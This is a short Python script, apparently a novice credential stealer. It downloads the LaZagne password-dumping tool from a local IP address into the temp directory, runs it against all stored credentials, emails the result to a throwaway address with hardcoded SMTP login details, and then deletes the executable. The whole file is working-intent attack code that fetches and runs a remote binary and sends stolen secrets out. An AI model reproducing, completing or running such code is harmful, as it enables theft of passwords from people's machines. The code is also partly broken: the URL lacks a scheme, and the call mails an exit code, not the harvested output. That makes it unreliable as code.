import subprocess, smtplib, os, requests, tempfile


def download(url):
    get_responce = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_responce.content)


def send_mail(email, passwaord, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, passwaord)
    server.sendmail(email, email, message)
    server.quit()


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("192.168.43.38/files/LaZagne.exe")
result = subprocess.call("LaZagne.exe all", shell=True)
send_mail("jacasa6477@nmaller.com", "12345678", result)
os.remove("LaZagne.exe")
